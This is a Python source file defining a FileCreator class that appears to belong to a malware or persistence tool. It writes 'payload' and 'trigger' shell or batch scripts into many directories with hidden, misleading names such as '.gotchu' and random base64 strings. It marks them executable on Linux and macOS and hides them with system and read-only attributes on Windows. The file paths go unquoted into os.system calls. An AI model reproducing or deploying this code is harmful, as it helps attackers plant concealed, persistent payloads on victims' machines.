from base64 import b64encode
from uuid import uuid1
from os import makedirs
from os.path import isdir
from os import system


class FileCreator:
    def __init__(self, current_os, root_directory) -> None:
        self.os = current_os
        self.root_directory = root_directory
        self.directory_to_store = [
            "var/",
            "share/",
            "usr/",
            ".wow/",
            ".nice/",
            ".this_is_good/",
            ".hehe/",
            ".gotchu/",
            f".{self.get_file_name()}/",
            f".{self.get_file_name()}/",
            f".{self.get_file_name()}/"
        ]
        if self.os == "Windows":
            self.ext = "bat"
        elif self.os == "Linux" or self.os == "Darwin":
            self.ext = "sh"

    @staticmethod
    def get_file_name():
        return b64encode(str(uuid1()).encode('utf-8')).decode('utf-8')

    def set_file_attributes(self, file_path):
        if self.os == "Linux" or self.os == "Darwin":
            system(f'chmod +x {file_path}')
        elif self.os == "Windows":
            system(f'attrib +h +s +r {file_path}')

    def create_payload_files(self, payload_code):
        payload_files = []

        for dir in self.directory_to_store:
            dir_to_store = f"{self.root_directory}{dir}{self.get_file_name()}/"

            if not isdir(dir_to_store):
                makedirs(dir_to_store, exist_ok=True)

            file_path = f"{dir_to_store}.{self.get_file_name()}.{self.ext}"
            try:
                with open(file_path, "w+") as payload_write:
                    payload_write.write(payload_code)

                self.set_file_attributes(file_path=file_path)
            except Exception as e:
                continue
            else:
                payload_files.append(file_path)

        return payload_files

    def create_trigger_files(self, trigger_code):
        trigger_files = []

        for dir in self.directory_to_store:
            dir_to_store = f"{self.root_directory}{dir}{self.get_file_name()}/"

            if not isdir(dir_to_store):
                makedirs(dir_to_store, exist_ok=True)

            file_path = f"{dir_to_store}.{self.get_file_name()}.{self.ext}"

            try:
                with open(file_path, "w+") as trigger_write:
                    trigger_write.write(trigger_code)
                self.set_file_attributes(file_path=file_path)

            except Exception as e:
                continue
            else:
                trigger_files.append(file_path)

        return trigger_files
